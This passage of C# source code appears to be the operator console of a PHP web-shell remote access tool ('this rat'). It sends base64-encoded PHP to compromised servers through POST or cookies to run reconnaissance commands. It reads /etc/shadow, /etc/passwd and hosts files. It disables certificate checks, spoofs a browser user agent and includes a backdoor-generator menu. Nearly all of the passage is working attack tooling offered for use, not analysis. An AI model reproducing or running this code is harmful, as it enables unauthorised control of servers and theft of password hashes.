        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isWindows)
            {
                string phpCode = PHP.executeSystemCode(PHP.windowsOS_NetAccounts);
                executePHPCodeDisplayInRichTextBox(phpCode, "User Accounts");
            } else {
                MessageBox.Show("This client is linux!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isWindows)
            {
                string phpCode = PHP.executeSystemCode(PHP.windowsOS_Ipconfig);
                executePHPCodeDisplayInRichTextBox(phpCode, "ipconfig");
            } else {
                MessageBox.Show("This client is linux!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isWindows)
            {
                string phpCode = PHP.executeSystemCode(PHP.windowsOS_Ver);
                executePHPCodeDisplayInRichTextBox(phpCode, "ver");
            } else {
                MessageBox.Show("This client is linux!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }
            string phpCode = PHP.executeSystemCode(PHP.posixOS_Whoami);
            executePHPCodeDisplayInRichTextBox(phpCode, "whoami");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isLinux)
            {
                string phpCode = PHP.executeSystemCode(PHP.linuxOS_Ifconfig);
                executePHPCodeDisplayInRichTextBox(phpCode, "ifconfig");
            } else {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        #endregion

        #region READ_COMMON_FILES
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsTargetsMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isWindows)
            {
                string phpCode = PHP.readFileProcedure(PHP.windowsFS_hostTargets);
                executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
            } else {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isLinux)
            {
                string phpCode = PHP.readFileProcedure(PHP.linuxFS_NetworkInterfaces);
                executePHPCodeDisplayInRichTextBox(phpCode, "interfaces");
            } else {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linusVersionMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isLinux)
            {
                string phpCode = PHP.readFileProcedure(PHP.linuxFS_ProcVersion);
                executePHPCodeDisplayInRichTextBox(phpCode, "version");
            } else {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxhostsMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isLinux)
            {
                string phpCode = PHP.readFileProcedure(PHP.linuxFS_hostTargetsFile);
                executePHPCodeDisplayInRichTextBox(phpCode, "hosts");
            } else {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isLinux)
            {
                string phpCode = PHP.readFileProcedure(PHP.linuxFS_IssueFile);
                executePHPCodeDisplayInRichTextBox(phpCode, "issue.net");
            } else {
                MessageBox.Show("This client is windows!", "DERP!!");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void shadowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isLinux)
            {
                string phpCode = PHP.readFileProcedure(PHP.linuxFS_ShadowFile);
                executePHPCodeDisplayInRichTextBox(phpCode, "shadow");
            } else {
                MessageBox.Show("This Target does not have a shadow file (derp)", "You TARD");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void passwdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (Clients[g_SelectedTarget].isLinux)
            {
                string phpCode = PHP.readFileProcedure(PHP.linuxFS_PasswdFile);
                executePHPCodeDisplayInRichTextBox(phpCode, "passwd");
            } else {
                MessageBox.Show("This Target does not have a passwd file (derp)");
            }
        }

        #endregion

        #region WEB_REQUEST_FUNCTIONS

        //TODO socks5 doesnt work
        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <param name="postData"></param>
        /// <returns></returns>
        public string makeRequest(string url, string postData, int timeout = 60_000, bool disableSSLCheck = true)
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create(url);
                var data = Encoding.ASCII.GetBytes(postData);

                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
                request.Timeout = timeout;

                //disable SSL verification
                if (disableSSLCheck)
                {
                    request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                }

                //send the commands via [GET] & [COOKIE]
                if (Clients[url].SendDataViaCookie)
                {
                    request.Method = "GET";
                    request.CookieContainer = new CookieContainer();
                    request.CookieContainer.SetCookies(new Uri(url), postData);
                } else {
                    //send the commands via [POST]
                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.ContentLength = data.Length;

                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }
                }

                var response = (HttpWebResponse)request.GetResponse();

                if (response != null)
                {
                    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    return (string)responseString;
                }
                return "";
            }
            catch (Exception)
            {
                
                //if this borkes, you can probably mark client as red/strikethrough text (possibly remove)
                //MessageBox.Show(url + " is down.");
            }
            return "";
        }

        /// <summary>
        /// Wrapper for "makeRequest", appends encoding specific to this rat leaving "makeRequest" dynamic
        /// </summary>
        /// <param name="url"></param>
        /// <param name="code"></param>
        /// <returns></returns>
        public string executePHP(string url, string code)
        {
            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(code))
            {
                return "";
            }

            //remove extra spaces, line breakes, tabs, whitespace, urlendcode then base64 encode
            string minifiedCode = PHP.minifyCode(code);
            string encodedCode = HttpUtility.UrlEncode(minifiedCode);
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(encodedCode);
            string b64 = System.Convert.ToBase64String(plainTextBytes);
            var postData = Clients[url].RequestArgName + "=" + b64;
            return makeRequest(url, postData);
        }

        #endregion

        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
            backdoorGenerator.Show();
        }

        private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddHost addClientForm = new AddHost();
            addClientForm.Show();
        }
    }
}
